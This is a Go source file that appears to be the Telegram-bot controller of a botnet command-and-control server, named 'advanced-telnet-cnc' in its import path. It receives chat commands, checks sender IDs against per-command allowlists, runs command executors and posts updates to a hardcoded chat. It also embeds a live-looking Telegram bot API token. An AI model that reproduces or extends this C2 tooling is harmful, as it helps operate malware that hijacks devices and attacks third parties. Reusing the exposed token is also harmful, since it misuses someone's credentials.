package telegram

import (
	command "advanced-telnet-cnc/source/master/telegram/commands"
	"fmt"
	"github.com/mattn/go-shellwords"
	"log"
	"strings"

	"github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

var (
	Bot *tgbotapi.BotAPI
)

func Serve() {
	var err error
	Bot, err = tgbotapi.NewBotAPI("6358404637:AAHp7Ixnu7TzQsqcS4o_6vUhwQy_P_VJoiM")
	if err != nil {
		log.Panic(err)
	}

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	updates := Bot.GetUpdatesChan(u)

	for update := range updates {
		if update.Message == nil {
			continue
		}

		line := update.Message.Text

		if strings.Trim(line, " ") == "" {
			fmt.Println("test")
			continue
		}

		if strings.HasPrefix(line, "|") || strings.HasPrefix(line, "&") || strings.HasPrefix(line, "<") || strings.HasPrefix(line, ">") || strings.HasPrefix(line, ";") {
			fmt.Println("test2")
			continue
		}

		if !strings.HasPrefix(line, "/") {
			fmt.Println("test3")
			continue
		}

		line = strings.ReplaceAll(line, "@"+Bot.Self.UserName, "")

		args, err := shellwords.Parse(line)
		if err != nil {
			fmt.Println("test4")
			continue
		}

		cmd := command.Retrieve(args[0][1:])
		if cmd == nil {
			fmt.Println("test5")
			continue
		}

		if !InSlice(int(update.Message.Chat.ID), cmd.AllowedIDs) {
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, "[*] Not enough permissions!")
			msg.ReplyToMessageID = update.Message.MessageID
			_, err := Bot.Send(msg)
			if err != nil {
				continue
			}

			return
		}

		err = cmd.Executor(args[1:], Bot, update)
		if err != nil {
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, "[*] Error while executing command: "+err.Error())
			msg.ReplyToMessageID = update.Message.MessageID
			_, err := Bot.Send(msg)
			if err != nil {
				continue
			}

			continue
		}
	}
}

func Send(msg string) {
	if Bot == nil {
		return
	}

	go func() {
		channelID := 6140288795
		message := tgbotapi.NewMessage(int64(channelID), msg)
		_, _ = Bot.Send(message)
	}()
}

func InSlice(a int, list []int) bool {
	if len(list) < 1 {
		return true
	}

	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}
